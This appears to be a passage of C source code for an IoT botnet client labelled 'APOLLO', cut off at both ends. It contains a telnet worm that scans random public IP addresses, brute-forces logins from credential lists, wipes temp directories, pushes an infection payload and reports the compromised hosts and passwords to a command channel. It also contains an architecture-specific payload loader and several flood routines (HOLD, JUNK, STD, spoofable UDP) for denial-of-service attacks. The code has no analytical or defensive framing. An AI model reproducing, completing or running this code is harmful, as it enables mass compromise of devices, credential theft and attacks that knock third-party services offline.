return contains_success(buffer) || contains_fail(buffer);
}
int contains_string(char* buffer, char** strings)
{
int num_strings = 0, i = 0;

for(num_strings = 0; strings[++num_strings] != 0; );

for(i = 0; i < num_strings; i++)
{
if(strcasestr(buffer, strings[i]))
{
return 1;
}
}

return 0;
}

int connectTimeout(int fd, char *host, int port, int timeout)
{
struct sockaddr_in dest_addr;
fd_set myset;
struct timeval tv;
socklen_t lon;

int valopt;
long arg = fcntl(fd, F_GETFL, NULL);
arg |= O_NONBLOCK;
fcntl(fd, F_SETFL, arg);

dest_addr.sin_family = AF_INET;
dest_addr.sin_port = htons(port);
if(getHost(host, &dest_addr.sin_addr)) return 0;
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

if (res < 0) {
if (errno == EINPROGRESS) {
tv.tv_sec = timeout;
tv.tv_usec = 0;
FD_ZERO(&myset);
FD_SET(fd, &myset);
if (select(fd+1, NULL, &myset, NULL, &tv) > 0) {
lon = sizeof(int);
getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
if (valopt) return 0;
}
else return 0;
}
else return 0;
}

arg = fcntl(fd, F_GETFL, NULL);
arg &= (~O_NONBLOCK);
fcntl(fd, F_SETFL, arg);

return 1;
}

int listFork()
{
uint32_t parent, *newpids, i;
parent = fork();
if (parent <= 0) return parent;
numpids++;
newpids = (uint32_t*)malloc((numpids + 1) * 4);
for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
newpids[numpids - 1] = parent;
free(pids);
pids = newpids;
return parent;
}

int negotiate(int sock, unsigned char *buf, int len)
{
unsigned char c;

switch (buf[1]) {
case CMD_IAC: /*dropped an extra 0xFF wh00ps*/ return 0;
case CMD_WILL:
case CMD_WONT:
case CMD_DO:
case CMD_DONT:
c = CMD_IAC;
send(sock, &c, 1, MSG_NOSIGNAL);
if (CMD_WONT == buf[1]) c = CMD_DONT;
else if (CMD_DONT == buf[1]) c = CMD_WONT;
else if (OPT_SGA == buf[1]) c = (buf[1] == CMD_DO ? CMD_WILL : CMD_DO);
else c = (buf[1] == CMD_DO ? CMD_WONT : CMD_DONT);
send(sock, &c, 1, MSG_NOSIGNAL);
send(sock, &(buf[2]), 1, MSG_NOSIGNAL);
break;

default:
break;
}

return 0;
}

int matchPrompt(char *bufStr)
{
char *prompts = ":>%$#\0";

int bufLen = strlen(bufStr);
int i, q = 0;
for(i = 0; i < strlen(prompts); i++)
{
while(bufLen > q && (*(bufStr + bufLen - q) == 0x00 || *(bufStr + bufLen - q) == ' ' || *(bufStr + bufLen - q) == '\r' || *(bufStr + bufLen - q) == '\n')) q++;
if(*(bufStr + bufLen - q) == prompts[i]) return 1;
}

return 0;
}

int readUntil(int fd, char *toFind, int matchLePrompt, int timeout, int timeoutusec, char *buffer, int bufSize, int initialIndex)
{
int bufferUsed = initialIndex, got = 0, found = 0;
fd_set myset;
struct timeval tv;
tv.tv_sec = timeout;
tv.tv_usec = timeoutusec;
unsigned char *initialRead = NULL;

while(bufferUsed + 2 < bufSize && (tv.tv_sec > 0 || tv.tv_usec > 0))
{
FD_ZERO(&myset);
FD_SET(fd, &myset);
if (select(fd+1, &myset, NULL, NULL, &tv) < 1) break;
initialRead = buffer + bufferUsed;
got = recv(fd, initialRead, 1, 0);
if(got == -1 || got == 0) return 0;
bufferUsed += got;
if(*initialRead == 0xFF)
{
got = recv(fd, initialRead + 1, 2, 0);
if(got == -1 || got == 0) return 0;
bufferUsed += got;
if(!negotiate(fd, initialRead, 3)) return 0;
} else {
if(strstr(buffer, toFind) != NULL || (matchLePrompt && matchPrompt(buffer))) { found = 1; break; }
}
}

if(found) return 1;
return 0;
}

in_addr_t GetRandomIP(in_addr_t netmask)
{
in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
return tmp ^ ( rand_cmwc() & ~netmask);
}

unsigned short csum (unsigned short *buf, int count)
{
register uint64_t sum = 0;
while( count > 1 ) { sum += *buf++; count -= 2; }
if(count > 0) { sum += *(unsigned char *)buf; }
while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
return (uint16_t)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph)
{

struct tcp_pseudo
{
unsigned long src_addr;
unsigned long dst_addr;
unsigned char zero;
unsigned char proto;
unsigned short length;
} pseudohead;
unsigned short total_len = iph->tot_len;
pseudohead.src_addr=iph->saddr;
pseudohead.dst_addr=iph->daddr;
pseudohead.zero=0;
pseudohead.proto=IPPROTO_TCP;
pseudohead.length=htons(sizeof(struct tcphdr));
int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
unsigned short *tcp = malloc(totaltcp_len);
memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
unsigned short output = csum(tcp,totaltcp_len);
free(tcp);
return output;
}

void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
iph->ihl = 5;
iph->version = 4;
iph->tos = 0;
iph->tot_len = sizeof(struct iphdr) + packetSize;
iph->id = rand_cmwc();
iph->frag_off = 0;
iph->ttl = MAXTTL;
iph->protocol = protocol;
iph->check = 0;
iph->saddr = source;
iph->daddr = dest;
}

int sclose(int fd)
{
if(3 > fd) return 1;
close(fd);
return 0;
}
int socket_connect(char *host, in_port_t port) {
struct hostent *hp;
struct sockaddr_in addr;
int on = 1, sock;
if ((hp = gethostbyname(host)) == NULL) return 0;
bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
addr.sin_port = htons(port);
addr.sin_family = AF_INET;
sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
if (sock == -1) return 0;
if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1)
return 0;
return sock;
}
static uint8_t ipState[5] = {0};
in_addr_t getRandomPublicIP()
{
        ipState[0] = rand() % 255;
        ipState[1] = rand() % 255;
        ipState[2] = rand() % 255;
        ipState[3] = rand() % 255;
 
        while(
                (ipState[0] == 0) ||
                (ipState[0] == 10) ||
                (ipState[0] == 100 && (ipState[1] >= 64 && ipState[1] <= 127)) ||
                (ipState[0] == 127) ||
                (ipState[0] == 169 && ipState[1] == 254) ||
                (ipState[0] == 172 && (ipState[1] <= 16 && ipState[1] <= 31)) ||
                (ipState[0] == 192 && ipState[1] == 0 && ipState[2] == 2) ||
                (ipState[0] == 192 && ipState[1] == 88 && ipState[2] == 99) ||
                (ipState[0] == 192 && ipState[1] == 168) ||
                (ipState[0] == 198 && (ipState[1] == 18 || ipState[1] == 19)) ||
                (ipState[0] == 198 && ipState[1] == 51 && ipState[2] == 100) ||
                (ipState[0] == 203 && ipState[1] == 0 && ipState[2] == 113) ||
                (ipState[0] == 188 && ipState[1] == 209 && ipState[2] == 52) ||
                (ipState[0] == 188 && ipState[1] == 209 && ipState[2] == 49) ||
                (ipState[0] == 185 && ipState[1] == 62 && ipState[2] == 190) ||
                (ipState[0] == 185 && ipState[1] == 62 && ipState[2] == 189) ||
                (ipState[0] == 185 && ipState[1] == 62 && ipState[2] == 188) ||
                (ipState[0] == 185 && ipState[1] == 61 && ipState[2] == 137) ||
                (ipState[0] == 185 && ipState[1] == 61 && ipState[2] == 136) ||
                (ipState[0] == 185 && ipState[1] == 11 && ipState[2] == 147) ||
                (ipState[0] == 185 && ipState[1] == 11 && ipState[2] == 146) ||
                (ipState[0] == 185 && ipState[1] == 11 && ipState[2] == 145) ||
                (ipState[0] == 63 && ipState[1] == 141 && ipState[2] == 241) ||
                (ipState[0] == 69 && ipState[1] == 30 && ipState[2] == 192) ||
                (ipState[0] == 69 && ipState[1] == 30 && ipState[2] == 244) ||
                (ipState[0] == 69 && ipState[1] == 197 && ipState[2] == 128) ||
                (ipState[0] == 162 && ipState[1] == 251 && ipState[2] == 120) ||
                (ipState[0] == 173 && ipState[1] == 208 && ipState[2] == 128) ||
                (ipState[0] == 173 && ipState[1] == 208 && ipState[2] == 180) ||
                (ipState[0] == 173 && ipState[1] == 208 && ipState[2] == 250) ||
                (ipState[0] == 192 && ipState[1] == 187 && ipState[2] == 113) ||
                (ipState[0] == 198 && ipState[1] == 204 && ipState[2] == 241) ||
                (ipState[0] == 204 && ipState[1] == 10 && ipState[2] == 160) ||
                (ipState[0] == 204 && ipState[1] == 12 && ipState[2] == 192) ||
                (ipState[0] == 208 && ipState[1] == 110 && ipState[2] == 64) ||
                (ipState[0] == 208 && ipState[1] == 110 && ipState[2] == 72) ||
                (ipState[0] == 208 && ipState[1] == 67) ||
                (ipState[0] == 94 && ipState[1] == 102 && ipState[2] == 48) ||
                (ipState[0] == 93 && ipState[1] == 174 && ipState[2] == 88) ||
                (ipState[0] == 89 && ipState[1] == 248 && ipState[2] == 174) ||
                (ipState[0] == 89 && ipState[1] == 248 && ipState[2] == 172) ||
                (ipState[0] == 89 && ipState[1] == 248 && ipState[2] == 170) ||
                (ipState[0] == 89 && ipState[1] == 248 && ipState[2] == 169) ||
                (ipState[0] == 89 && ipState[1] == 248 && ipState[2] == 160) ||
                (ipState[0] >= 224)
            )
        {
                ipState[0] = rand() % 255;
                ipState[1] = rand() % 255;
                ipState[2] = rand() % 255;
                ipState[3] = rand() % 255;
        }
 
        char ip[16] = {0};
        szprintf(ip, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);
        return inet_addr(ip);
}
 
in_addr_t getRandomPublicIP2()
{
        int range = rand() % (sizeof(oldranges)/sizeof(char *));
        ipState[0] = oldranges[range];
        ipState[1] = oldranges2[range];
        ipState[2] = rand() % 255;
        ipState[3] = rand() % 255;
        char ip[16] = {0};
        szprintf(ip, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);
        return inet_addr(ip);
}
 
in_addr_t getRandomPublicIPA()
{
        int range = rand() % (sizeof(rangesA)/sizeof(char *));
        ipState[0] = rangesA[range];
        ipState[1] = rand() % 255;
        ipState[2] = rand() % 255;
        ipState[3] = rand() % 255;
        char ip[16] = {0};
        szprintf(ip, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);
        return inet_addr(ip);
}
 
in_addr_t getRandomPublicIPB()
{
        int range = rand() % (sizeof(rangesB1)/sizeof(char *));
        ipState[0] = rangesB1[range];
        ipState[1] = rangesB2[range];
        ipState[2] = rand() % 255;
        ipState[3] = rand() % 255;
        char ip[16] = {0};
        szprintf(ip, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);
        return inet_addr(ip);
}
 
in_addr_t getRandomPublicIPC()
{
        int range = rand() % (sizeof(rangesC1)/sizeof(char *));
        ipState[0] = rangesC1[range];
        ipState[1] = rangesC2[range];
        ipState[2] = rangesC3[range];
        ipState[3] = rand() % 255;
        char ip[16] = {0};
        szprintf(ip, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);
        return inet_addr(ip);
}
 
 
in_addr_t findARandomIP()
{
    if(rangechoice < 1 || rangechoice > 5){
        return getRandomPublicIP();
    }else{
        if(rangechoice == 1){
            return getRandomPublicIP2();
        }else if(rangechoice == 2){
            return getRandomPublicIPA();
        }else if(rangechoice == 3){
            return getRandomPublicIPB();
        }else if(rangechoice == 4){
            return getRandomPublicIPC();
        }else{
            return getRandomPublicIP();
        }
    }
}
 
 
 
in_addr_t getRandomIP(in_addr_t netmask)
{
        in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
        return tmp ^ ( rand_cmwc() & ~netmask);
}
void StartTheLelz(int wait_usec, int maxfds)
{
        int i, res, num_tmps, j;
        char buf[128], cur_dir;
 
        int max = maxfds;
        fd_set fdset;
        struct timeval tv;
        socklen_t lon;
        int valopt;
 
        srand(time(NULL) ^ rand_cmwc());
       
        char line[256];
        char* buffer;
        struct sockaddr_in dest_addr;
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(23);
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
 
        buffer = malloc(BUFFER_SIZE + 1);
        memset(buffer, 0, BUFFER_SIZE + 1);
 
        struct telstate_t fds[max];
 
 
        memset(fds, 0, max * (sizeof(int) + 1));
        for(i = 0; i < max; i++)
        {
                memset(&(fds[i]), 0, sizeof(struct telstate_t));
                fds[i].complete = 1;
                fds[i].sockbuf = buffer;
        }
        for(num_tmps = 0; tmpdirs[++num_tmps] != 0; );
 
 
 
        while(1)
        {
                for(i = 0; i < max; i++)
                {
                        if(fds[i].totalTimeout == 0)
                        {
                                fds[i].totalTimeout = time(NULL);
                        }
 
                        switch(fds[i].state)
                        {
                        case 0:
                                {
                                        if(fds[i].complete == 1)
                                        {
                                                // clear the current fd
                                                char *tmp = fds[i].sockbuf;
                                                memset(&(fds[i]), 0, sizeof(struct telstate_t));
                                                fds[i].sockbuf = tmp;
                                                // get a new random ip
                                                fds[i].ip = findARandomIP();
                                        }
                                        else if(fds[i].complete == 0)
                                        {
                                                fds[i].passwordInd++;
                                                fds[i].usernameInd++;
 
                                                if(fds[i].passwordInd == sizeof(passwords) / sizeof(char *))
                                                {
                                                        fds[i].complete = 1;
                                                        continue;
                                                }
                                                if(fds[i].usernameInd == sizeof(usernames) / sizeof(char *))
                                                {
                                                        fds[i].complete = 1;
                                                        continue;
                                                }
                                        }
 
                                        dest_addr.sin_family = AF_INET;
                                        dest_addr.sin_port = htons(23);
                                        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
                                        dest_addr.sin_addr.s_addr = fds[i].ip;
 
                                        fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
 
                                        if(fds[i].fd == -1) continue;
 
                                        fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
 
                                        if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) == -1 && errno != EINPROGRESS)
                                        {
                                                reset_telstate(&fds[i]);
                                        }
                                        else
                                        {
                                                advance_state(&fds[i], 1);
                                        }
                                }
                                break;
 
                                                                case 1:
                                                                    {
                                                                        FD_ZERO(&fdset);
                                                                        FD_SET(fds[i].fd, &fdset);
                                                                        tv.tv_sec = 0;
                                                                        tv.tv_usec = wait_usec;
                                                                        res = select(fds[i].fd+1, NULL, &fdset, NULL, &tv);
                                                   
                                                                        if(res == 1)
                                                                        {
                                                                            lon = sizeof(int);
                                                                            valopt = 0;
                                                                            getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                                                                            //printf("%d\n",valopt);
                                                                            if(valopt)
                                                                            {
                                                                                reset_telstate(&fds[i]);
                                                                            }
                                                                            else
                                                                            {
                                                                                fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) & (~O_NONBLOCK));
                                                                                advance_state(&fds[i], 2);
                                                                            }
                                                                            continue;
                                                                        }
                                                                        else if(res == -1)
                                                                        {
                                                                            reset_telstate(&fds[i]);
                                                                            continue;
                                                                        }
                                                   
                                                                        if(fds[i].totalTimeout + 6 < time(NULL))
                                                                        {
                                                                            reset_telstate(&fds[i]);
                                                                        }
                                                                    }
                                                                    break;
                                                   
                                                                case 2:
                                                                    {
                                                                        if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, BUFFER_SIZE, advances))
                                                                        {
                                                                            if(contains_fail(fds[i].sockbuf))
                                                                            {
                                                                                advance_state(&fds[i], 0);
                                                                            }
                                                                            else
                                                                            {
                                                                                advance_state(&fds[i], 3);
                                                                            }
                                                   
                                                                            continue;
                                                                        }
                                                   
                                                                        if(fds[i].totalTimeout + 6 < time(NULL))
                                                                        {
                                                                            reset_telstate(&fds[i]);
                                                                        }
                                                                    }
                                                                    break;
                                                   
                                                                case 3:
                                                                    {
                                                                        if(send(fds[i].fd, usernames[fds[i].usernameInd], strlen(usernames[fds[i].usernameInd]), MSG_NOSIGNAL) < 0)
                                                                        {
                                                                            reset_telstate(&fds[i]);
                                                                            continue;
                                                                        }
                                                   
                                                                        if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0)
                                                                        {
                                                                            reset_telstate(&fds[i]);
                                                                            continue;
                                                                        }
                                                   
                                                                        advance_state(&fds[i], 4);
                                                                    }
                                                                    break;
                                                   
                                                                case 4:
                                                                    {
                                                                        if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, BUFFER_SIZE, advances))
                                                                        {
                                                                            if(contains_fail(fds[i].sockbuf))
                                                                            {
                                                                                advance_state(&fds[i], 0);
                                                                            }
                                                                            else
                                                                            {
                                                                                advance_state(&fds[i], 5);
                                                                            }
                                                                            continue;
                                                                        }
                                                   
                                                                        if(fds[i].totalTimeout + 6 < time(NULL))
                                                                        {
                                                                            reset_telstate(&fds[i]);
                                                                        }
                                                                    }
                                                                    break;
                                                   
                                                                case 5:
                                                                    {
                                                                        if(send(fds[i].fd, passwords[fds[i].passwordInd], strlen(passwords[fds[i].passwordInd]), MSG_NOSIGNAL) < 0)
                                                                        {
                                                                            reset_telstate(&fds[i]);
                                                                            continue;
                                                                        }
                                                   
                                                                        if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0)
                                                                        {
                                                                            reset_telstate(&fds[i]);
                                                                            continue;
                                                                        }
                                                   
                                                                        advance_state(&fds[i], 6);
                                                                    }
                                                                    break;
                                                   
                                                                case 6:
                                                                    {
                                                                        if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, BUFFER_SIZE, advances2))
                                                                        {
                                                                            fds[i].totalTimeout = time(NULL);
                                                   
                                                                            if(contains_fail(fds[i].sockbuf))
                                                                            {
                                                                                advance_state(&fds[i], 0);
                                                                            }
                                                                            else if(contains_success(fds[i].sockbuf))
                                                                            {
                                                                                if(fds[i].complete == 2)
                                                                                {
                                                                                    advance_state(&fds[i], 7);
                                                                                }
                                                                                else
                                                                                {
                                                                                    advance_state(&fds[i], 7);
                                                                                }
                                                                            }
                                                                            else
                                                                            {
                                                                                reset_telstate(&fds[i]);
                                                                            }
                                                                            continue;
                                                                        }
 
                                                   
                                                                        if(fds[i].totalTimeout + 7 < time(NULL))
                                                                        {
                                                                            reset_telstate(&fds[i]);
                                                                        }
                                                                    }
                                                                    break;                         
                                                                case 7:
                                                                    {
                                                                        for(j = 0; j < num_tmps; j++)
                                                                        {
                                                                            memset(buf, 0, 128);
                                                                            if(j == 0)
                                                                                snprintf(buf, 127, ">%s.t && cd %s && for a in `ls -a %s`; do >$a; done; >retrieve\r\n", tmpdirs[j], tmpdirs[j], tmpdirs[j], tmpdirs[j]);
                                                                            else
                                                                                snprintf(buf, 127, ">%s.t && cd %s ; >retrieve\r\n", tmpdirs[j], tmpdirs[j], tmpdirs[j]);
                                                   
                                                                            if(send(fds[i].fd, buf, strlen(buf), MSG_NOSIGNAL) < 0)
                                                                            {
                                                                                reset_telstate(&fds[i]);
                                                                                continue;
                                                                            }
                                                                        }                                              
                                                                        advance_state(&fds[i], 8);
                                                                    }
                                  break;
                                  case 8:
                                  {
                              fds[i].totalTimeout = time(NULL);
                              if(send(fds[i].fd, infect, strlen(infect), MSG_NOSIGNAL) < 0)
                                  {
                                    reset_telstate(&fds[i]);
                                    continue;
                                  }
                                    if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, BUFFER_SIZE, infected))
                                    {
                                        if(strcasestr(fds[i].sockbuf, infectedmessage) && fds[i].complete != 3)
                                        {
                                            sockprintf(mainCommSock, "\x1b[1;30m|\x1b[1;37m\x1b[46mAPOLLO\x1b[0m\x1b[1;30m| INFECTION SUCCESS - %s:%s:%s", get_telstate_host(&fds[i]), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
                                            sockprintf(mainCommSock, "TELNET %s:23 %s:%s", inet_ntoa(*(struct in_addr *)&(fds[i].ip)), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
											fds[i].complete = 3;
                                        }
                                    }
                                      if(fds[i].totalTimeout + 300 < time(NULL))
                                      {
                                        if(fds[i].complete !=3){
                                            sockprintf(mainCommSock, "\x1b[1;30m|\x1b[1;37m\x1b[46mAPOLLO\x1b[0m\x1b[1;30m| FAILED TO INFECT - %s:%s:%s", get_telstate_host(&fds[i]), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);  
                                        }
                                        reset_telstate(&fds[i]);
                                      }
                                    break;
                        }
            }
        }
    }              
}
char *getBuild_echo() {
  #ifdef ARCH_MIPS
  return "MIPS";
  #endif
  #ifdef ARCH_MIPSEL
  return "MIPSEL";
  #endif
  #ifdef ARCH_SH4
  return "SH4";
  #endif
  #ifdef ARCH_X86_64
  return "x86_64";
  #endif
  #ifdef ARCH_I5
  return "i586";
  #endif
  #ifdef ARCH_I6
  return "i686";
  #endif
  #ifdef ARCH_PPC
  return "PPC";
  #endif
  #ifdef ARCH_M68K
  return "m68k";
  #endif
  #ifdef ARCH_SPARC
  return "sparc";
  #endif
  #ifdef ARCH_ARMv4
  return "ARMv4";
  #endif
  #ifdef ARCH_ARMv5
  return "ARMv5";
  #endif
  #ifdef ARCH_ARM6
  return "ARMv6";
  #endif
}
/*
mips
mipsel
sh4
x86_64
i586
i686
powerpc
m68k
sparc
armv4
armv5
armv6
*/
void fixedEchoLoader() 
{
	char buffer[BUFFER_SIZE];
	char echo[666];
	int fd;
	int arch;
	arch = getBuild_echo();
	fd = socket_connect("127.0.0.1", 80);
	if (arch == "MIPS") 
	{
		snprintf(echo, sizeof(buffer), "GET %s\r\n", mips);
		write(fd, echo, strlen(echo));
  }
  if (arch == "MIPSEL") 
	{
		snprintf(echo, sizeof(buffer), "GET %s\r\n", mipsel);
		write(fd, echo, strlen(echo));
  }
  if (arch == "SH4") 
	{
		snprintf(echo, sizeof(buffer), "GET %s\r\n", sh4);
		write(fd, echo, strlen(echo));
  }
  if (arch == "x86_64") 
	{
		snprintf(echo, sizeof(buffer), "GET %s\r\n", x86_64);
		write(fd, echo, strlen(echo));
  }
  if (arch == "i586") 
	{
		snprintf(echo, sizeof(buffer), "GET %s\r\n", i586);
		write(fd, echo, strlen(echo));
  }
	if (arch == "i686") 
	{
		snprintf(echo, sizeof(buffer), "GET %s\r\n", i686);
		write(fd, echo, strlen(echo));
  }
  if (arch == "PPC") 
	{
		snprintf(echo, sizeof(buffer), "GET %s\r\n", powerpc);
		write(fd, echo, strlen(echo));
  }
  if (arch == "m68k") 
	{
		snprintf(echo, sizeof(buffer), "GET %s\r\n", m68k);
		write(fd, echo, strlen(echo));
  }
  if (arch == "sparc") 
	{
		snprintf(echo, sizeof(buffer), "GET %s\r\n", sparc);
		write(fd, echo, strlen(echo));
  }
  if (arch == "ARMv4") 
  {
    snprintf(echo, sizeof(buffer), "GET %s\r\n", armv4);
    write(fd, echo, strlen(echo));
  }
  if (arch == "ARMv5") 
  {
    snprintf(echo, sizeof(buffer), "GET %s\r\n", armv5);
    write(fd, echo, strlen(echo));
  }
  if (arch == "ARMv6") 
  {
    snprintf(echo, sizeof(buffer), "GET %s\r\n", armv6);
    write(fd, echo, strlen(echo));
  }
  else 
  {
    write(fd, "GET *\r\n", strlen("GET *\r\n"));
  }
  bzero(buffer, BUFFER_SIZE);
  while(read(fd, buffer, BUFFER_SIZE - 1) != 0)
  {
    FILE *f;
    f = fopen("x", "a");
    fprintf(f, "%s", buffer);
    fclose(f);
    bzero(buffer, BUFFER_SIZE);
  }
  shutdown(fd, SHUT_RDWR); 
  close(fd);
}
//Sends HOLD Flood
void sendHOLD(unsigned char *ip, int port, int end_time)
{
int max = getdtablesize() / 2, i;
struct sockaddr_in dest_addr;
dest_addr.sin_family = AF_INET;
dest_addr.sin_port = htons(port);
if(getHost(ip, &dest_addr.sin_addr)) return;
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
struct state_t
{
int fd;
uint8_t state;
} fds[max];
memset(fds, 0, max * (sizeof(int) + 1));
fd_set myset;
struct timeval tv;
socklen_t lon;
int valopt, res;
unsigned char *watwat = malloc(1024);
memset(watwat, 0, 1024);
int end = time(NULL) + end_time;
while(end > time(NULL))
{
for(i = 0; i < max; i++)
{
switch(fds[i].state)
{
case 0:
{
fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS) close(fds[i].fd);
else fds[i].state = 1;
}
break;
case 1:
{
FD_ZERO(&myset);
FD_SET(fds[i].fd, &myset);
tv.tv_sec = 0;
tv.tv_usec = 10000;
res = select(fds[i].fd+1, NULL, &myset, NULL, &tv);
if(res == 1)
{
lon = sizeof(int);
getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
if(valopt)
{
close(fds[i].fd);
fds[i].state = 0;
} else {
fds[i].state = 2;
}
} else if(res == -1)
{
close(fds[i].fd);
fds[i].state = 0;
}
}
break;
case 2:
{
FD_ZERO(&myset);
FD_SET(fds[i].fd, &myset);
tv.tv_sec = 0;
tv.tv_usec = 10000;
res = select(fds[i].fd+1, NULL, NULL, &myset, &tv);
if(res != 0)
{
close(fds[i].fd);
fds[i].state = 0;
}
}
break;
}
}
}
}
void sendJUNK(unsigned char *ip, int port, int end_time)
{

	int max = getdtablesize() / 2, i;

	struct sockaddr_in dest_addr;
	dest_addr.sin_family = AF_INET;
	dest_addr.sin_port = htons(port);
	if(getHost(ip, &dest_addr.sin_addr)) return;
	memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

	struct state_t
	{
		int fd;
		uint8_t state;
	} fds[max];
	memset(fds, 0, max * (sizeof(int) + 1));

	fd_set myset;
	struct timeval tv;
	socklen_t lon;
	int valopt, res;

	unsigned char *watwat = malloc(1024);
	memset(watwat, 0, 1024);

	int end = time(NULL) + end_time;
	while(end > time(NULL))
	{
		for(i = 0; i < max; i++)
		{
			switch(fds[i].state)
			{
			case 0:
				{
					fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
					fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
					if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS) close(fds[i].fd);
					else fds[i].state = 1;
				}
				break;

			case 1:
				{
					FD_ZERO(&myset);
					FD_SET(fds[i].fd, &myset);
					tv.tv_sec = 0;
					tv.tv_usec = 10000;
					res = select(fds[i].fd+1, NULL, &myset, NULL, &tv);
					if(res == 1)
					{
						lon = sizeof(int);
						getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
						if(valopt)
						{
							close(fds[i].fd);
							fds[i].state = 0;
						} else {
							fds[i].state = 2;
						}
					} else if(res == -1)
					{
						close(fds[i].fd);
						fds[i].state = 0;
					}
				}
				break;

			case 2:
				{
					makeRandomStr(watwat, 1024);
					if(send(fds[i].fd, watwat, 1024, MSG_NOSIGNAL) == -1 && errno != EAGAIN)
					{
						close(fds[i].fd);
						fds[i].state = 0;
					}
				}
				break;
			}
		}
	}
}
void sendSTD(unsigned char *ip, int port, int secs) {

int iSTD_Sock;

iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);

time_t start = time(NULL);

struct sockaddr_in sin;

struct hostent *hp;

hp = gethostbyname(ip);

bzero((char*) &sin,sizeof(sin));
bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
sin.sin_family = hp->h_addrtype;
sin.sin_port = port;

unsigned int a = 0;

while(1){
char *randstrings[] = {"arfgG", "HBiug655", "KJYDFyljf754", "LIKUGilkut769458905", "JHFDSkgfc5747694", "GJjyur67458", "RYSDk747586", "HKJGi5r8675", "KHGK7985i", "yuituiILYF", "GKJDghfcjkgd4", "uygtfgtrevf", "tyeuhygbtfvg", "ewqdcftr", "trbazetghhnbrty", "tbhrwsehbg", "twehgbferhb", "etrbhhgetrb", "edfverthbyrtb", "kmiujmnhnhfgn", "zcdbvgdfsbgfd", "gdfbtsdgb", "ghdugffytsdyt", "tgerthgwtrwry", "yteytietyue", "qsortEQS", "8969876hjkghblk", "std", "dts", "lsk", "kek", "smack", "ily", "tyf", "pos", "cunts"};
char *STD2_STRING = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
if (a >= 50)
{
send(iSTD_Sock, STD2_STRING, STD2_SIZE, 0);
connect(iSTD_Sock,(struct sockaddr *) &sin, sizeof(sin));
if (time(NULL) >= start + secs)
{
close(iSTD_Sock);
_exit(0);
}
a = 0;
}
a++;
}
}

void sendUDP(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime)
{
struct sockaddr_in dest_addr;

dest_addr.sin_family = AF_INET;
if(port == 0) dest_addr.sin_port = rand_cmwc();
else dest_addr.sin_port = htons(port);
if(getHost(target, &dest_addr.sin_addr)) return;
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

register unsigned int pollRegister;
pollRegister = pollinterval;

if(spoofit == 32)
{
int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
if(!sockfd)
{
sockprintf(mainCommSock, "Failed opening raw socket.");
return;
}

unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
if(buf == NULL) return;
memset(buf, 0, packetsize + 1);
makeRandomStr(buf, packetsize);

int end = time(NULL) + timeEnd;
register unsigned int i = 0;
register unsigned int ii = 0;
while(1)
{
